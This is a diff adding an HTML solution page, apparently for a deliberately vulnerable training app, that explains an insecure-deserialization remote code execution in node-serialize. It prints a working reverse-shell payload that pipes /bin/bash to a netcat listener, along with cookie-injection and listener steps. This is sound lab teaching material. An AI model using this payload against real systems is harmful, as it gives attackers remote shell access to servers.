@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+  <style>
+  body,h1,h2,h3,h4,h5,h6 {font-family: "Lato", sans-serif}
+  .w3-bar,h1,button {font-family: "Montserrat", sans-serif}
+  p {font-size: 20px}
+  </style>
+</head>
+<body>
+  <header class="w3-container w3-teal w3-center">
+    <h1>Insecure Deserialization Remote Code Execution</h1>
+  </header>
+  <div class="w3-container" style="padding:0px 150px">
+    <p>This vulnerability was built around the vulnerability described in this <a class="w3-text-red" href="https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/">paper</a>.
+      The session token is being serialized with a node library that is known to be vulnerable to remote code execution. In order to trigger this vulnerability we have to craft a payload using the same library. If you
+      have not read the paper it is recommended so that you understand the payload. In the payloads folder first install the node-serialize library by running <span class="w3-text-green">npm install node-serialize</span>.
+      Next, there is a file called <span class="w3-text-red">payloadGenerator.js</span>, run this file using <span class="w3-text-green">node payloadGenerator.js</span>.
+      You will be presented with the payload: <span class="w3-text-red">{"rce":"_$$ND_FUNC$$_function () {var net = require(\"net\"), sh = require(\"child_process\").exec(\"/bin/bash\");var client = new net.Socket();client.connect(1234, \"127.0.0.1\", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});}"}</span>.
+      In order to make the payload automatically execute we need to add "()" to the end like
+      <span class="w3-text-red">{"rce":"_$$ND_FUNC$$_function () {var net = require(\"net\"), sh = require(\"child_process\").exec(\"/bin/bash\");var client = new net.Socket();client.connect(1234, \"127.0.0.1\", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});}<span class="w3-text-blue">()</span>"}</span>. Next,
+      take the payload and base64 encode it and use this value to replace your current session token value using the JavaScript console as described in the guide. Next open up another terminal window and start a netcat listener listening on port
+      1234 <span class="w3-text-green">nc -l 127.0.0.1 1234</span> then visit the account page to trigger the deserialization vulnerability. You will not see anything happen however if you run a command on you netcat
+      terminal like "ls" you will see that it executes and gives you the server's directory contents. <br><img src="/images/solutions/remote-shell.png"><br> You have thus demonstrated it is possible to achieve a remote shell on
+      the server. After exploiting this vulnerability you should remove the payload cookie and restart the system so that it will function normally.
+    </p>
+  </div>
+
+</body>
+</html>
